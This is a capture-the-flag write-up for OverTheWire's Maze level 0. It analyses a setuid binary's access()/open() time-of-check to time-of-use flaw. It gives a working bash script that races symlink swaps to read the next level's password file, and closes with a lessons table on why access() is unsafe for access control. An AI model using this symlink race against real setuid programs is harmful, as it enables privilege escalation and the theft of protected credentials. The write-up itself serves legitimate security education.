# OverTheWire — Maze Level 0 → 1

> Goal: Get `maze1` password from `maze0`. Result: **`**********`** (hidden)
> Technique: **TOCTOU race condition** — `access()`/`open()` "confused deputy".

---

## 1. Connection
```bash
ssh maze0@maze.labs.overthewire.org -p 2225   # password: maze0
```
`/maze/maze0` → `-r-sr-x---  maze1 maze0` (setuid maze1). Binary is 32-bit, compiled with
debug_info (symbols present), Canary + NX enabled but irrelevant here.

## 2. Analysis (`objdump -d -M intel`)
Pseudocode:
```c
char buf[20];
if (access("/tmp/128ecf542a35ac5270a87dc740918404", R_OK) == 0) {  // check with REAL uid (maze0)
    setresuid(geteuid(), geteuid(), geteuid());                     // fully elevate to maze1
    int fd = open("/tmp/128ecf...404", O_RDONLY);                   // open with EFFECTIVE uid (maze1)
    read(fd, buf, 19);
    write(1, buf, 19);                                              // print contents
}
```

## 3. Vulnerability
- `access()` checks the **real uid** (maze0): "can the *caller* read this file?"
- But `open()` runs with **effective uid** (maze1) after `setresuid`.
- The file can be **replaced** via the same path between the two calls → classic **TOCTOU**
  (Time-Of-Check to Time-Of-Use) race.

A single symlink won't work: `access()` follows symlinks, and maze0 can't read the password file
so the check fails. The solution is to **swap** the target between the two calls:
- decoy → a file maze0 can read (`access` passes)
- secret → symlink to `/etc/maze_pass/maze1` (`open` reads it as maze1)

## 4. Exploit
Two loops: one rapidly alternates the symlink target, the other runs maze0 repeatedly.
```bash
P=/tmp/128ecf542a35ac5270a87dc740918404
echo DECOYDECOYDECOY > /tmp/decoy            # maze0 can read → access OK
( while :; do
    ln -sf /tmp/decoy "$P"
    ln -sf /etc/maze_pass/maze1 "$P"
  done ) &                                    # background: continuously swap
while :; do
  out=$(/maze/maze0 | tr -d '\0')
  case "$out" in *DECOY*|"") : ;; *) echo "WIN: $out"; break;; esac
done
```
When `access()` sees the decoy and passes, but `open()` hits the secret symlink at that very
moment, the password is printed.


## Lessons
| Topic | Note |
|-------|------|
| TOCTOU | The `access()`+`open()` pair is a classic race condition; check and use are not atomic |
| `access()` trap | Checks real uid; must never be used for access-control decisions (only `open()` + error check is correct) |
| Confused deputy | The setuid program performs high-privilege actions on behalf of a low-privilege caller |
| Winning the race | Continuous `ln -sf` swap + running the target in a loop is sufficient |
